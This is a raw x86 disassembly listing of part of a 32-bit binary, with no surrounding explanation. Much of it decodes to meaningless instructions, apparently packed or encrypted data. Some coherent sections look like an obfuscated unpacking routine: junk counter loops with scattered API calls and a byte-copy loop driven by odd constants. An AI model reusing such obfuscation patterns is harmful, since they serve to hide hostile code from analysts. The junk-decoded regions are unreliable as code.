  41017a:	inc    ecx
  41017b:	lds    eax,FWORD PTR [edi+0x3e]
  41017e:	pop    edx
  41017f:	pop    ebp
  410180:	jmp    0xf21b:0xd0626fe5
  410187:	and    ecx,ebx
  410189:	inc    bx
  41018b:	ficom  WORD PTR [edx]
  41018d:	and    BYTE PTR [esp+esi*1],0x89
  410191:	cli    
  410192:	or     DWORD PTR [edx],esi
  410194:	clc    
  410195:	sbb    BYTE PTR [ebp+0x5a],cl
  410198:	fild   WORD PTR [ebx]
  41019a:	sbb    al,0x24
  41019c:	(bad)  
  41019d:	clc    
  41019e:	and    eax,0xa8740639
  4101a4:	loope  0x4101e0
  4101a6:	sahf   
  4101a7:	dec    edi
  4101a8:	ins    DWORD PTR es:[edi],dx
  4101a9:	dec    ebp
  4101aa:	imul   ecx,DWORD PTR [esi+0x1c],0x4c
  4101ae:	(bad)  
  4101af:	in     eax,0xf2
  4101b1:	adc    ch,dl
  4101b3:	and    al,0xd
  4101b5:	dec    BYTE PTR [ecx]
  4101b7:	fidivr WORD PTR [eax-0x13]
  4101ba:	lea    esi,ds:0x8df232c4
  4101c0:	hlt    
  4101c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101c3:	jns    0x410146
  4101c5:	or     eax,0xb51769b2
  4101ca:	(bad)  
  4101cb:	mov    ebx,0x674eb9a4
  4101d0:	std    
  4101d1:	fs dec edx
  4101d3:	xchg   ecx,eax
  4101d4:	pop    ss
  4101d5:	mov    ecx,0x79645f92
  4101da:	ret    
  4101db:	les    ecx,FWORD PTR [edx+0x4fe3a1bc]
  4101e1:	xchg   ecx,eax
  4101e2:	mov    edx,0xb1c9e347
  4101e7:	inc    ebp
  4101e8:	mov    esi,0xe98f4af2
  4101ed:	out    0x46,eax
  4101ef:	push   esp
  4101f0:	mov    edx,0xfb29b896
  4101f5:	xor    bl,al
  4101f7:	imul   ebp,esp,0x49c546cb
  4101fd:	enter  0x6ea8,0xcb
  410201:	(bad)  
  410203:	stos   DWORD PTR es:[edi],eax
  410204:	sar    BYTE PTR [edi-0x31],1
  410207:	pop    edx
  410208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410209:	hlt    
  41020a:	lea    eax,[eax]
  41020c:	mov    cl,0x45
  41020e:	or     eax,0x2df79a64
  410213:	mov    ecx,0x3b4428e8
  410218:	xor    eax,0xdb083ea9
  41021d:	jmp    0x41024d
  41021f:	adc    eax,0x4a40e9f3
  410224:	cld    
  410225:	or     esp,DWORD PTR [ebx-0x5c4f2e44]
  41022b:	jg     0x41022f
  41022d:	fisttp WORD PTR [edx+0x65]
  410230:	push   0x52
  410232:	dec    ebp
  410233:	mov    bh,0xc4
  410235:	adc    eax,0xefaf941a
  41023a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41023b:	adc    BYTE PTR [ecx+0x4d68b4cd],bh
  410241:	mov    ds:0x25f33807,al
  410246:	inc    eax
  410247:	add    al,BYTE PTR [esi+0x57b8f10f]
  41024d:	mov    ah,0x94
  41024f:	mov    ds:0x3a2618ed,al
  410254:	ret    
  410255:	leave  
  410256:	push   ds
  410257:	push   esp
  410258:	adc    DWORD PTR [ebp-0x1f7cdffe],0xc502adb
  410262:	mov    ch,0x5c
  410264:	cmp    BYTE PTR [eax+ecx*2-0x5e76f8b],cl
  41026b:	xor    BYTE PTR [ebx],dh
  41026d:	aad    0xc2
  41026f:	inc    ebp
  410270:	mov    al,0xfc
  410272:	loope  0x4101f8
  410274:	add    DWORD PTR [eax+0x6c6b726c],ebx
  41027a:	add    al,0xff
  41027c:	push   ecx
  41027d:	lock nop
  41027f:	add    eax,0x995a9841
  410284:	jg     0x4102f9
  410286:	push   0xc9908d41
  41028b:	out    0x99,al
  41028d:	fsub   QWORD PTR [eax]
  41028f:	ins    DWORD PTR es:[edi],dx
  410290:	cwde   
  410291:	inc    ecx
  410292:	out    0x70,al
  410294:	mov    ebp,0xc7f8758b
  410299:	add    eax,0x4336eb
  41029e:	mov    ch,0x5
  4102a0:	add    BYTE PTR [eax],al
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43360f,0x433703
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433613,0x12
  4102c6:	cmp    DWORD PTR ds:0x433613,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433613,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433613,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433613
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433613,eax
  410303:	mov    eax,ds:0x433613
  410308:	dec    eax
  410309:	mov    ds:0x433613,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43360f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43360f
  41036b:	inc    eax
  41036c:	mov    ds:0x43360f,eax
  410371:	cmp    DWORD PTR ds:0x43360f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43360f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43360f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43360f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43360f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43361f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43367f,0x4336bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433667
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp-0x23e420b5],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x41037c
  4103eb:	and    dl,BYTE PTR [ebp-0x158305e3]
  4103f1:	adc    eax,0x81cec68b
  4103f6:	aaa    
  4103f7:	push   esp
  4103f8:	dec    edx
  4103f9:	pop    esi
  4103fa:	push   ss
  4103fb:	aad    0x22
  4103fd:	mov    ebx,0x52dbea80
  410402:	push   ss
  410403:	bound  ecx,QWORD PTR [ecx+edx*4-0x5]
  410407:	fsub   QWORD PTR [eax-0x5c]
  41040a:	or     ah,bl
  41040c:	enter  0x2b3d,0xcd
  410410:	mov    ?,WORD PTR [edx]
  410412:	sub    BYTE PTR [ebx-0x3c],dl
  410415:	jmp    0x4103fe
  410417:	aaa    
  410418:	push   es
  410419:	test   eax,0x1ce8412
  41041e:	jne    0x4103e2
  410420:	cmp    BYTE PTR [ebx],0x86
  410423:	and    al,0xd8
  410425:	into   
  410426:	jl     0x410490
  410428:	icebp  
  410429:	fld    st(5)
  41042b:	mov    DWORD PTR [ebp-0x2155cef4],eax
  410431:	int    0xbf
  410433:	in     al,dx
  410434:	lahf   
  410435:	aaa    
  410436:	jmp    0x58b6b205
  41043b:	push   edx
  41043c:	mov    al,ds:0xf86cd15
  410441:	stc    
  410442:	mov    BYTE PTR [eax-0x72cbd6a1],dl
  410448:	call   0x387972a
  41044d:	mov    esi,0x88462423
  410452:	or     DWORD PTR [esi+0x269dc067],edx
  410458:	sub    dl,BYTE PTR [ebx]
  41045a:	or     al,0xf4
  41045c:	loope  0x410483
  41045e:	out    0x42,eax
  410460:	mov    edi,0x49907154
  410465:	sub    al,0xf3
  410467:	ret    
  410468:	arpl   bx,dx
  41046a:	shr    BYTE PTR [esi-0x79],0xa3
  41046e:	push   esi
  41046f:	jns    0x410465
  410471:	mov    dl,0x56
  410473:	jecxz  0x4104b5
  410475:	(bad)  [edi+eax*4]
  410478:	mov    al,0xfc
  41047a:	nop
  41047b:	or     ebp,DWORD PTR [ebp-0x33bb53de]
  410481:	inc    esi
  410482:	outs   dx,BYTE PTR ds:[esi]
  410483:	aaa    
  410484:	mov    dl,0x62
  410486:	(bad)  
  410487:	mov    ebp,ss
  410489:	enter  0x2b7f,0x2b
  41048d:	jo     0x4104c7
  41048f:	xor    al,0xa7
  410491:	fstp   DWORD PTR [edi+eax*4]
  410494:	loope  0x410513
  410496:	mov    esp,0x530b589f
  41049b:	and    al,0xb8
  41049d:	xchg   ebp,eax
  41049e:	inc    edx
  41049f:	icebp  
  4104a0:	mov    ds:0xf9991ebe,eax
  4104a5:	xchg   esi,eax
  4104a6:	shr    DWORD PTR [esp+ecx*2-0x170c5535],cl
  4104ad:	dec    esi
  4104ae:	or     dl,dl
  4104b0:	jecxz  0x4104c7
  4104b2:	mov    cs,WORD PTR [ebx]
  4104b4:	mov    ?,WORD PTR [edi-0xcbe848e]
  4104ba:	cmc    
  4104bb:	sub    eax,0xc34e9d4e
  4104c0:	or     BYTE PTR [ecx],cl
  4104c2:	or     eax,0xc76843a4
  4104c7:	in     eax,0x83
  4104c9:	(bad)  
  4104cb:	arpl   WORD PTR [edi+esi*1+0x60],bp
  4104cf:	dec    ebp
  4104d0:	pop    ds
  4104d1:	dec    esi
  4104d2:	ja     0x410544
  4104d4:	sbb    al,0x23
  4104d6:	cld    
  4104d7:	nop
  4104d8:	jmp    0x4104f4
  4104da:	leave  
  4104db:	jp     0x41052d
  4104dd:	pusha  
  4104de:	rcl    dh,0x1e
  4104e1:	push   0x3c
  4104e3:	ficomp WORD PTR [edx+esi*1]
  4104e6:	cmp    eax,0xeaf5a314
  4104eb:	push   es
  4104ec:	sar    ebp,0x44
  4104ef:	clc    
  4104f0:	les    edi,FWORD PTR [ebp+eiz*4-0x14c5a778]
  4104f7:	sub    al,0xba
  4104f9:	sub    eax,0x59bfa989
  4104fe:	jbe    0x410507
  410500:	cmp    eax,0xe2deea83
  410505:	mov    ch,0xe2
  410507:	jl     0x410577
  410509:	jns    0x410533
  41050b:	add    al,BYTE PTR [ebp-0x5dbda28e]
  410511:	push   edx
  410512:	scas   eax,DWORD PTR es:[edi]
  410513:	(bad)  
  410514:	stc    
  410515:	retf   
  410516:	shl    BYTE PTR [esi+0x29],cl
  410519:	cmp    esp,edi
  41051b:	in     al,dx
  41051c:	sti    
  41051d:	or     eax,0xbf086224
  410522:	aaa    
  410523:	shr    al,1
  410525:	pop    edi
  410526:	mov    ds:0xb98e860f,eax
  41052b:	mov    eax,gs
  41052d:	fisubr DWORD PTR [eax]
  41052f:	push   ds
  410530:	(bad)
  410533:	pop    ss
  410534:	push   0x54
  410536:	in     eax,dx
  410537:	push   cs
  410538:	xor    eax,0x87262a11
  41053d:	mov    eax,ds:0xc955e4e3
  410542:	les    esi,FWORD PTR [eax]
  410544:	rcl    DWORD PTR [ecx+0x18b86d66],0x8b
  41054b:	xchg   DWORD PTR [eax],esi
  41054d:	or     eax,0x9f3ea403
  410552:	pusha  
  410553:	sbb    al,0x43
  410555:	xchg   eax,edi
  410557:	sub    bh,BYTE PTR [esi-0x146b1455]
  41055d:	sub    DWORD PTR [ecx],ecx
  41055f:	icebp  
  410560:	shr    DWORD PTR [ebx-0x6b],cl
  410563:	inc    ecx
  410564:	mov    ?,WORD PTR [eax-0x32]
  410567:	dec    ecx
  410568:	in     eax,dx
  410569:	dec    edx
  41056a:	add    DWORD PTR [eax+0x61],ebp
  41056d:	adc    eax,0x32169ac2
  410572:	jae    0x4105c2
  410574:	in     eax,0x1a
  410576:	lds    edi,FWORD PTR [ebx+0x52cc8221]
  41057c:	add    esp,DWORD PTR [ebp+0x57]
  41057f:	pop    eax
  410580:	add    eax,0x9707f961
  410585:	aaa    
  410586:	rcl    DWORD PTR [eax-0x3],0xe4
  41058a:	push   0xffffffb6
  41058c:	punpcklwd mm4,DWORD PTR [edi]
  41058f:	fiadd  DWORD PTR [esp+eiz*2]
  410592:	aam    0xa5
  410594:	add    bh,BYTE PTR [eax+0x6af825c5]
  41059a:	shr    BYTE PTR [ecx-0x56],0x7a
  41059e:	(bad)  
  41059f:	into   
  4105a0:	jnp    0x410522
  4105a2:	out    dx,eax
  4105a3:	and    DWORD PTR [edx],0xffffffe3
  4105a6:	stos   BYTE PTR es:[edi],al
  4105a7:	in     eax,0x5d
  4105a9:	aam    0x6b
  4105ab:	stos   DWORD PTR es:[edi],eax
  4105ac:	lea    ebx,[eax]
  4105ae:	mov    bh,0xa
  4105b0:	push   ebx
  4105b1:	mov    ebp,DWORD PTR [esi+edi*2+0x6ba0d95]
  4105b8:	int3   
  4105b9:	(bad)  
  4105ba:	out    dx,al
  4105bb:	test   eax,0xff45f6cc
  4105c0:	aaa    
  4105c1:	fcmovbe st,st(5)
  4105c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105c4:	into   
  4105c5:	mov    edx,0x9f524816
  4105ca:	add    al,0xb2
  4105cc:	xchg   edi,eax
  4105cd:	inc    edi
  4105ce:	cld    
  4105cf:	xor    BYTE PTR [ebp+0x74],dl
  4105d2:	jne    0x410652
  4105d4:	push   ss
  4105d5:	pushf  
  4105d6:	sti    
  4105d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105d8:	aas    
  4105d9:	and    dl,bh
  4105db:	into   
  4105dc:	or     cl,BYTE PTR [edi]
  4105de:	inc    edx
  4105df:	mov    bl,0xd
  4105e1:	jns    0x410631
  4105e3:	push   0x5dffe2af
  4105e8:	adc    DWORD PTR [eax-0x65],edi
  4105eb:	and    al,0xa8
  4105ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105ee:	cmp    al,0xe4
  4105f0:	or     ebp,DWORD PTR [edi-0x330fd5a6]
  4105f6:	mov    ch,0xac
  4105f8:	xchg   esp,eax
  4105f9:	shr    BYTE PTR [ebx],1
  4105fb:	aad    0xe5
  4105fd:	enter  0x4560,0x3b
  410601:	add    bh,BYTE PTR [ebx-0x41bc570f]
  410607:	mov    ah,0x44
  410609:	scas   eax,DWORD PTR es:[edi]
  41060a:	xchg   bl,dl
  41060c:	and    DWORD PTR cs:[esi+ebp*2+0x69],edi
  410611:	jmp    0x9b1d:0xdf954d07
  410618:	je     0x410648
  41061a:	(bad)  
  41061c:	pop    ebx
  41061d:	cmp    edi,eax
  41061f:	mov    ebx,0x872225c1
  410624:	hlt    
  410625:	sub    BYTE PTR [ebx+0x7e764f6d],0x2a
  41062c:	or     al,0x6a
  41062e:	pop    ds
  41062f:	test   eax,0x67710c92
  410634:	cmp    al,0x3b
  410636:	jnp    0x41064f
  410638:	mov    ch,0xe0
  41063a:	jecxz  0x410672
  41063c:	inc    esp
  41063d:	icebp  
  41063e:	pop    ebp
  41063f:	push   ebx
  410640:	xor    BYTE PTR [eax+0x4e4fdd17],cl
  410646:	sbb    al,0x95
  410648:	xor    al,0x37
  41064a:	and    al,0x39
  41064c:	push   ds
  41064d:	icebp  
  41064e:	int3   
  41064f:	push   cs
  410650:	(bad)  
  410651:	mov    ebp,0x3d2bcfbc
  410656:	or     al,0x15
  410658:	hlt    
  410659:	imul   ecx
  41065b:	or     BYTE PTR [eax],dl
  41065d:	stc    
  41065e:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  410665:	and    DWORD PTR ds:0x433613,0x0
  41066f:	mov    edx,DWORD PTR ds:0x433613
  410675:	inc    edx
  410676:	mov    DWORD PTR ds:0x433613,edx
  41067c:	cmp    DWORD PTR ds:0x433613,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433613,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4336ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43361b
  4106ad:	mov    DWORD PTR ds:0x4336ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433633,0x17
  4106c0:	cmp    DWORD PTR ds:0x433633,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433633,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4337fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433633,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433633
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433633,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433633
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433633,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4336f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4336b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433617,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433627,0x4336ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	shr    BYTE PTR [ecx-0x446ec2f7],0x7e
  4107db:	jle    0x4107c7
  4107dd:	jl     0x41085d
  4107df:	jle    0x4107b2
  4107e1:	pop    esp
  4107e2:	pop    ds
  4107e3:	xchg   edx,eax
  4107e5:	inc    esp
  4107e6:	int3   
  4107e7:	and    bl,BYTE PTR [eax+0x6c364ec4]
  4107ed:	in     eax,dx
  4107ee:	pushf  
  4107ef:	(bad)  
  4107f0:	aaa    
  4107f1:	ja     0x410841
  4107f3:	pop    ds
  4107f4:	pop    ds
  4107f5:	out    0x49,al
  4107f7:	adc    ecx,DWORD PTR [esi]
  4107f9:	(bad)  
  4107fa:	in     al,dx
  4107fb:	fistp  QWORD PTR [edx-0x6ac39e27]
  410801:	jge    0x41082b
  410803:	or     ecx,ebx
  410805:	sahf   
  410806:	outs   dx,BYTE PTR ds:[esi]
  410807:	mov    edx,0xee370dc9
  41080c:	ins    DWORD PTR es:[di],dx
  41080e:	mov    bh,bh
  410810:	sti    
  410811:	fstp   DWORD PTR [ebp+0x54]
  410814:	sahf   
  410815:	fisubr WORD PTR [esi]
  410817:	mov    dl,0x6
  410819:	pop    ds
  41081a:	(bad)  
  41081b:	mov    dl,0x9d
  41081d:	inc    esp
  41081e:	outs   dx,DWORD PTR ds:[esi]
  41081f:	inc    edi
  410820:	je     0x41084c
  410822:	icebp  
  410823:	mov    eax,0xe552b6ac
  410828:	jb     0x4107ff
  41082a:	fs inc edi
  41082c:	aam    0xda
  41082e:	add    al,0xd1
  410830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410831:	popf   
  410832:	retf   0xf4a4
  410835:	mov    edx,0xb1327aaf
  41083a:	arpl   WORD PTR [edi-0x4f2da5bb],bp
  410840:	imul   esp,DWORD PTR [ebp+0x42],0x45
  410844:	push   ss
  410845:	gs pop esp
  410847:	xchg   edi,eax
  410848:	xlat   BYTE PTR ds:[ebx]
  410849:	xor    BYTE PTR [esi+0x163b1a5f],bh
  41084f:	xor    BYTE PTR [eax+ecx*2+0x54],0x45
  410854:	pop    eax
  410855:	int3   
  410856:	mov    al,0x8c
  410858:	retf   
  410859:	sub    eax,0xb90648d2
  41085e:	xchg   ecx,eax
  41085f:	mov    dl,BYTE PTR [edi]
  410861:	loope  0x410841
  410863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410864:	ret    
  410865:	pushf  
  410866:	fs mul esp
  410869:	pop    ebp
  41086a:	test   eax,0xd79bab6e
  41086f:	scas   eax,DWORD PTR es:[edi]
  410870:	jg     0x4108bb
  410872:	xor    ecx,edx
  410874:	jo     0x4108ab
  410876:	aas    
  410877:	xchg   edi,eax
  410878:	ret    
  410879:	cmp    al,0x2e
  41087c:	das    
  41087d:	cmp    eax,0xe769a972
  410882:	mov    ebx,0x686d5c37
  410887:	lahf   
  410888:	mov    edx,0xbbf506ba
  41088d:	es ret 
  41088f:	dec    ecx
  410890:	add    ah,BYTE PTR [edi+0x22]
  410893:	sti    
  410894:	xchg   ebx,eax
  410895:	and    BYTE PTR [esi-0x55],dh
  410898:	fcom   QWORD PTR [edi+ecx*4]
  41089b:	inc    ebp
  41089c:	imul   esi,DWORD PTR [ebx],0x8dfdb081
  4108a2:	mov    ah,0xaf
  4108a4:	shr    DWORD PTR [ebx],0x78
  4108a7:	or     BYTE PTR [edx-0x39503100],dh
  4108ad:	jno    0x41087b
  4108af:	shr    edx,1
  4108b1:	sar    BYTE PTR [ebx],cl
  4108b3:	test   al,0xfc
  4108b5:	fist   DWORD PTR cs:[edi]
  4108b8:	mov    esi,0xc2eed441
  4108bd:	cwde   
  4108be:	add    cl,ah
  4108c0:	iret   
  4108c1:	rcl    DWORD PTR [ebp-0x6f0e8560],1
  4108c7:	stos   DWORD PTR es:[edi],eax
  4108c8:	into   
  4108c9:	inc    eax
  4108ca:	loope  0x4108ca
  4108cc:	aam    0xfa
  4108ce:	and    BYTE PTR [esi+0x6],dh
  4108d1:	clc    
  4108d2:	adc    BYTE PTR [esi-0x39],ch
  4108d5:	(bad)  
  4108d6:	adc    edx,ebp
  4108d8:	push   ss
  4108d9:	test   esi,esi
  4108db:	lods   eax,DWORD PTR ds:[esi]
  4108dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108dd:	and    cl,BYTE PTR [ecx-0x1782efde]
  4108e3:	xchg   ebx,eax
  4108e4:	std    
  4108e5:	addr16 addr16 (bad) 
  4108e8:	(bad)  
  4108e9:	mov    eax,0x732a2d28
  4108ee:	inc    ecx
  4108ef:	inc    esi
  4108f0:	push   ebx
  4108f1:	(bad)  
  4108f3:	ins    BYTE PTR es:[edi],dx
  4108f4:	fidiv  WORD PTR [ebx+esi*4-0x42]
  4108f8:	call   0x23ed:0x97b84c66
  4108ff:	push   ecx
  410900:	mov    ebp,0xd3f28739
  410905:	and    eax,0x686cd4d5
  41090a:	loop   0x4108d8
  41090c:	(bad)  
  41090d:	enter  0xbc7,0x76
  410911:	mov    dl,0x88
  410913:	(bad)  
  410914:	sti    
  410915:	adc    DWORD PTR [eax+0x46f0f068],ebp
  41091b:	jge    0x4108c5
  41091d:	and    bl,BYTE PTR [ebx]
  41091f:	rcl    DWORD PTR ds:0x427defeb,cl
  410925:	into   
  410926:	and    al,0x65
  410928:	xlat   BYTE PTR ds:[ebx]
  410929:	and    dl,BYTE PTR [ecx+0x3ee91f6]
  41092f:	pop    es
  410930:	(bad)  
  410931:	jle    0x4109a8
  410933:	pop    esp
  410934:	xchg   BYTE PTR [edi],dl
  410936:	bound  eax,QWORD PTR [edi+edi*8]
  410939:	stc    
  41093a:	sub    ah,BYTE PTR [ebx-0xe]
  41093d:	xchg   esi,eax
  41093e:	fbstp  TBYTE PTR [ecx+0x62aefd7b]
  410944:	cmp    al,0x8
  410946:	inc    edx
  410947:	(bad)  
  410948:	cs pop esp
  41094a:	add    edi,eax
  41094c:	push   edi
  41094d:	cmp    al,0xba
  41094f:	dec    esi
  410950:	stc    
  410951:	ret    0x496d
  410954:	jge    0x4108f4
  410956:	or     cl,BYTE PTR [edx]
  410958:	inc    ebx
  410959:	pop    esp
  41095a:	test   eax,0xac429925
  41095f:	fwait
  410960:	or     al,0x84
  410962:	add    eax,0xad328f2c
  410967:	aas    
  410968:	xchg   BYTE PTR ds:0xfeb0fcc5,al
  41096e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41096f:	scas   eax,DWORD PTR es:[edi]
  410970:	pop    ss
  410971:	(bad)  
  410972:	pop    eax
  410973:	push   esi
  410974:	call   0x574:0x687a4f11
  41097b:	in     eax,0x99
  41097d:	pop    ebx
  41097e:	scas   eax,DWORD PTR es:[edi]
  41097f:	leave  
  410980:	jns    0x410960
  410982:	mov    bl,0xb8
  410984:	cwde   
  410985:	cmp    eax,0xa35ed389
  41098a:	ins    DWORD PTR es:[edi],dx
  41098b:	test   DWORD PTR [edi-0x6f],ebx
  41098e:	and    ecx,esi
  410990:	imul   esp,DWORD PTR [eax],0x31
  410993:	and    al,0x94
  410995:	sti    
  410996:	lock xor al,0x80
  410999:	shl    DWORD PTR [ebp-0x4c965f55],cl
  41099f:	pop    ss
  4109a0:	shl    DWORD PTR [ecx+0x72],0x47
  4109a4:	pop    ecx
  4109a5:	pop    edi
  4109a6:	mov    ah,BYTE PTR [ecx+0x3dec36ea]
  4109ac:	mov    esp,0x12295e78
  4109b1:	sub    DWORD PTR [ebx],0x7
  4109b4:	in     eax,0x34
  4109b6:	bound  ebx,QWORD PTR [edi+0x1b02e215]
  4109bc:	or     DWORD PTR [ebx+ecx*4+0x21],edx
  4109c0:	in     eax,dx
  4109c1:	or     cl,BYTE PTR [ebx+eax*8+0x3b652dd7]
  4109c8:	xchg   esp,eax
  4109c9:	fsub   DWORD PTR [ecx]
  4109cb:	or     eax,0x80e0b3f1
  4109d0:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4109d2:	add    eax,0xba23997d
  4109d7:	lds    ebx,FWORD PTR [ecx]
  4109d9:	dec    ecx
  4109da:	inc    esp
  4109db:	or     bh,0xbd
  4109de:	xor    dl,BYTE PTR [edx-0x27]
  4109e1:	or     DWORD PTR [esi-0x4ec696ef],ebp
  4109e7:	stos   BYTE PTR es:[edi],al
  4109e8:	rol    DWORD PTR [ecx+0x673cb12f],1
  4109ee:	mov    al,ds:0xd259d6f4
  4109f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109f4:	inc    esp
  4109f5:	mov    esi,0x72657d28
  4109fa:	dec    esi
  4109fb:	add    DWORD PTR [ecx],edx
  4109fd:	pusha  
  4109fe:	out    0x3f,eax
  410a00:	js     0x4109e2
  410a02:	loopne 0x410a05
  410a04:	push   edi
  410a05:	pop    esi
  410a06:	ds cld 
  410a08:	jne    0x4109f2
  410a0a:	imul   eax,DWORD PTR [esi+0x70],0x40c6c085
  410a11:	outs   dx,DWORD PTR ds:[esi]
  410a12:	push   ebp
  410a13:	les    edx,FWORD PTR [edi]
  410a15:	push   es
  410a16:	xor    ah,BYTE PTR [edx+0x2a45e7]
  410a1c:	out    0x99,eax
  410a1e:	das    
  410a1f:	mov    esi,0x3a675b50
  410a24:	lea    edi,[eax-0x67]
  410a27:	inc    ebp
  410a28:	cwde   
  410a29:	dec    edx
  410a2a:	clc    
  410a2b:	or     al,dl
  410a2d:	cli    
  410a2e:	dec    ecx
  410a2f:	sub    ah,BYTE PTR [ebx-0x6d]
